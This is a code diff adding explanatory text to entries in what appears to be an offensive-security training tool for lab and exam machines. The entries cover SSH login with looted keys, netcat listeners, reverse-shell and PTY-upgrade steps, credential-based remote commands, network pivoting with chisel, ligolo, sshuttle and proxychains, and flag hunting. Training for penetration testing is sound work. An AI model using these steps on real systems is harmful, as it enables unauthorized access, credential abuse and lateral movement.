+      why: "A private key recovered from loot, an LFI read, a backup, a readable home, a git dump, is a clean foothold whenever SSH is reachable: no password, no brute-force. Save it, chmod 600 it (SSH refuses loose permissions), and log in. Reach for it the moment you find a PEM key. The one puzzle is the username, so look at the key's path and the files around it for whose key it is.",
       cmd: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10', tool: 'ssh',
       output: [
         'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
@@ -1574,6 +1705,7 @@
       teach: 'A private key you looted is a password-free login, but SSH refuses a key others can read, hence chmod 600. A stable SSH session beats any reverse shell: it has a real TTY and survives. Try looted keys against every user and host.',
     },
     'shell-listener': {
+      why: "Every reverse shell needs a catcher waiting before the payload fires, so starting the listener is the step people forget and then wonder why their shell \"did not work\". Reach for it right before you trigger any reverse-shell payload. The discipline to build: listener first, confirm it is listening, then fire the payload, because a callback with nothing to catch it is just a lost shell.",
       cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
       output: [
         'Listening on 0.0.0.0 4444',
@@ -1582,6 +1714,7 @@
       teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first, a callback with nothing listening is lost.',
     },
     'shell-revshell-linux': {
+      why: "A confirmed command-execution primitive on Linux becomes an interactive shell by firing a bash or python callback to your waiting listener. Reach for it once you can run commands (through a web bug, a service, SSH) and want hands-on access. Match the payload to what the target actually has: not every box has bash or python, so knowing a couple of fallbacks (nc, perl) is what keeps a one-shot RCE from going to waste.",
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
       teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it, code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
       steps: [
@@ -1595,6 +1728,7 @@
       ],
     },
     'shell-revshell-windows': {
+      why: "A command-execution primitive on Windows becomes a shell via a PowerShell or nc.exe callback to your listener. Reach for it once you can run commands on a Windows target. The practical wrinkle is that Windows payloads get caught by Defender more than Linux ones, so understanding a couple of variants, and the defense-enum findings about exclusions, is what makes the difference between a shell and an alert.",
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
       teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
       steps: [
@@ -1608,6 +1742,7 @@
       ],
     },
     'shell-pty-upgrade': {
+      why: "A freshly caught reverse shell is dumb: line-buffered, no Ctrl-C, no job control, and su, sudo, and vim all refuse to work properly in it. Upgrading it to a full PTY fixes all of that. Reach for it immediately after you catch a shell, before you try anything interactive. It is a small ritual (a python pty spawn, then stty) that saves constant frustration, so make it automatic.",
       signal: 'www-data@target:/$ export TERM=xterm',
       teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. The fix is two-sided: spawn a PTY inside the shell, then background it with Ctrl-Z and fix YOUR terminal with stty before foregrounding. Do it before anything interactive, like su or ssh.',
       steps: [
@@ -1622,6 +1757,7 @@
       ],
     },
     'linux-remote-exec': {
+      why: "With a Linux credential (a password or a key) and SSH reachable, you can run commands without holding an interactive session, which is ideal for quick enumeration, privesc checks, and grabbing flags. Reach for it when you have creds and want to work fast or scriptably. It is the difference between fumbling in a fragile reverse shell and running clean commands over real SSH, prefer it whenever you have the credentials.",
       cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
       output: [
         'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
@@ -1632,6 +1768,7 @@
 
     // ============================ PIVOTING & TUNNELING ============================
     'local-linux-interfaces': {
+      why: "Before you can pivot you need to know what the foothold can see, and a second network interface is the clearest sign of a network behind this host that you cannot reach directly. Reach for it right after landing a Linux shell, as part of orienting. A box with one NIC is a dead end for pivoting; a box with two is a doorway, and this is how you tell which you have.",
       cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
       output: [
         '2: eth0    inet 10.10.10.10/24 scope global eth0',
@@ -1641,6 +1778,7 @@
       teach: 'A compromised host with a second NIC is a doorway. eth1 on 172.16.5.0/24 is a network you could not reach before, the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
     },
     'local-linux-routes': {
+      why: "The routing table on a foothold names the networks this host knows how to reach, which are your candidate targets for a tunnel. Reach for it alongside the interface check when you suspect there is more network behind the box. It keeps your pivoting honest: the routes tell you which subnets actually exist, so you build toward something real instead of guessing.",
       cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
       output: [
         'default via 10.10.10.1 dev eth0',
@@ -1650,6 +1788,7 @@
       teach: 'The routing table shows which networks this host reaches directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
     },
     'local-linux-neighbors': {
+      why: "The ARP neighbor cache lists hosts this box has recently talked to on its local segments, a weak but genuine hint about live internal machines. Reach for it when orienting a foothold for a pivot. It is not authoritative (caches age out), but a populated ARP table points you at real neighbors to validate once the tunnel is up, which beats scanning a whole subnet blind.",
       cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
       output: [
         '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
@@ -1659,6 +1798,7 @@
       teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment, live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
     },
     'local-linux-dns': {
+      why: "The resolver configuration on a foothold reveals the internal DNS servers, which are themselves high-value: internal DNS often knows every hostname in the environment and can be enumerated once you can reach it. Reach for it while mapping the network behind a Linux foothold. Internal DNS is both a target and a map, so noting the resolvers early pays off when the tunnel is built.",
       cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
       output: [
         'search acme.internal',
@@ -1668,6 +1808,7 @@
       teach: 'The internal DNS server and search domain tell you this host lives in acme.internal and resolves via 172.16.5.5, likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the network by name.',
     },
     'local-windows-interfaces': {
+      why: "Same orientation step as on Linux, from a Windows WinRM foothold: extra NICs, DNS servers, or subnets signal a network behind this host worth pivoting into. Reach for it right after landing on Windows. In AD environments especially, the second interface frequently faces the internal server segment where the domain controllers and the real targets live.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
@@ -1678,6 +1819,7 @@
       teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box, the reason to pivot. Map the interfaces first; they define what is now in range.',
     },
     'local-windows-routes': {
+      why: "The Windows route table exposes internal subnets before any tunnel exists, telling you where a pivot could reach. Reach for it alongside the interface check when orienting a Windows foothold. As on Linux, it keeps your pivoting honest: build the tunnel toward subnets the routes actually show, not toward guesses.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
@@ -1687,6 +1829,7 @@
       teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box, your pivot target.',
     },
     'local-windows-neighbors': {
+      why: "The Windows ARP cache names nearby internal hosts this box has spoken to, useful seeds for what to validate once a tunnel is up. Reach for it while mapping a Windows foothold's surroundings. Treat the entries as leads rather than gospel, but a known neighbor is a far better first target than a cold subnet sweep.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
@@ -1697,6 +1840,7 @@
       teach: 'The Windows ARP cache lists internal hosts this box has communicated with, confirmed-alive targets on the far side, found without sending a scan packet. Start your internal enumeration from these.',
     },
     'local-windows-listeners': {
+      why: "The listening sockets on a Windows foothold show which services run locally, including ones bound only to localhost that you could reach through a port-forward. Reach for it when deciding what to tunnel. A service on 127.0.0.1 is invisible from the network but wide open to you on the box, and forwarding its port is often the cleanest way in to it.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
@@ -1706,6 +1850,7 @@
       teach: 'A service bound to 127.0.0.1 is reachable only from the box itself, like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
     },
     'pivot-chisel-socks': {
+      why: "When the foothold can see an internal subnet you cannot, a reverse SOCKS proxy served by chisel routes your Kali tooling through the compromised host onto that segment. Reach for it when you have confirmed a reachable internal network and need your tools to reach it. \"Reverse\" matters: the agent connects back to you, which works even when the target cannot accept inbound connections, the usual case behind a firewall.",
       signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
       teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
       steps: [
@@ -1723,6 +1868,7 @@
       ],
     },
     'pivot-ligolo': {
+      why: "ligolo-ng builds a pivot as a real network interface on your box: the agent connects back, you add a route for the internal subnet, and those hosts answer as if directly attached, with no proxychains. Reach for it when you want a clean, fast pivot and are tired of wrapping every command. Its ergonomics, a TUN interface instead of a SOCKS proxy, are why many operators prefer it: your tools just work against the internal range.",
       signal: '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
       teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet, fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
       steps: [
@@ -1741,6 +1887,7 @@
       ],
     },
     'pivot-sshuttle': {
+      why: "With working SSH credentials on the foothold, sshuttle carries an entire subnet over that SSH session transparently, with no proxychains and no client proxy config. Reach for it when the pivot host has SSH and you have creds, it is the least-friction tunnel there is. The requirement is SSH access specifically, so it shines on Linux footholds where you already recovered a key or password.",
       cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
       output: [
         'c : Connected to server.',
@@ -1750,6 +1897,7 @@
       teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone, no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
     },
     'pivot-ssh-dynamic': {
+      why: "`ssh -D` alone stands up a SOCKS proxy through the foothold, the zero-extra-tooling pivot whenever you already hold SSH credentials. Reach for it when you want a quick tunnel and do not want to upload anything. It is the minimalist option: one SSH flag gives a working SOCKS proxy, which you point proxychains at. When you have SSH creds, this is often all the pivot you need.",
       signal: 'socks5 127.0.0.1 1080',
       teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy, the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
       steps: [
@@ -1758,6 +1906,7 @@
       ],
     },
     'pivot-scan-through': {
+      why: "Once a SOCKS tunnel is up, proxychains wrapping a TCP-connect nmap enumerates the now-reachable internal host, and it must be a connect scan (-sT), because SYN scans do not survive a SOCKS proxy. Reach for it immediately after building a tunnel, to learn what the internal target runs. The gotcha that bites everyone is forgetting -sT and -Pn; through a proxy, a normal nmap just hangs.",
       cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
       output: [
         'Nmap scan report for 172.16.5.20',
@@ -1771,6 +1920,7 @@
 
     // ============================ FLAGS & PROOF ============================
     'flag-hunt-linux': {
+      why: "The flags are the objective: reading them is how you prove the box is yours, and on the exam a flag you cannot screenshot is a flag you did not capture. Reach for it once you hold the access the flag requires (user flag with a user shell, root flag with root). The discipline that matters is proof: read the flag in a shell you can screenshot showing your access, because OffSec scores a flag grabbed remotely without that context as zero.",
       cmd: "find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null", tool: 'sh',
       output: [
         '/home/bob/user.txt',
@@ -1780,6 +1930,7 @@
       teach: 'The flags are the point: user.txt in a home directory, root.txt under /root. Capture both, and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
     },
     'flag-hunt-windows': {
+      why: "Same objective on Windows: read the flag files to prove the compromise, and print each one next to `ipconfig` so a single screenshot shows both the flag and the host it came from. Reach for it once you hold the required access. The exam scores proof, not just the string, so capture the flag inside an interactive session on the target with your identity and the host's IP visible, that screenshot is what earns the points.",
       cmd: 'nxc smb 10.10.10.10 -u administrator -H <nthash> --spider C$ --regex "(proof|user|root)\\.txt"', tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  TARGET  //C$/Users/bob/Desktop/user.txt',
